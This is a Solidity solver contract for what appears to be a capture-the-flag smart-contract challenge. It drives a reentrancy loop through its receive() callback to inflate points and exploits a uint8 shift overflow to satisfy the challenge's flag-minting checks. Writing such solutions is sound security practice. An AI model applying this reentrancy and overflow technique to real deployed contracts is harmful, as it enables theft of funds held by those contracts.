// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IChallenge6 {
    function claimPoints() external;
    function upgradeLevel() external;
    function mintFlag() external;
    function resetPoints() external;
}

contract S2Challenge6Solver {
    IChallenge6 public immutable challenge;
    uint256 public count;
    uint256 public target;

    constructor(address _challenge) {
        challenge = IChallenge6(_challenge);
    }

    // Handles the reentrancy callback
    receive() external payable {
        if (count < target) {
            count++;
            challenge.claimPoints();
        }
    }

    function solve() external {
        challenge.resetPoints();

        // Step 1: Reach Level 5
        // Each level costs 10 points. We do 5 bursts of 10 points.
        for (uint8 i = 0; i < 5; i++) {
            count = 1;
            target = 10;
            challenge.claimPoints();
            challenge.upgradeLevel();
        }

        // Step 2: Get exactly 9 Points
        // Final State: Points = 9, Levels = 5
        count = 1;
        target = 9;
        challenge.claimPoints();

        // Step 3: Mint the flag
        // Requirement Check:
        // 1. 9 < 10 (Points check)
        // 2. 9 * 5 = 45 (Power check >= 30)
        // 3. 9 << 5 = 288. In uint8: 288 % 256 = 32 (Key check)
        challenge.mintFlag();
    }
}
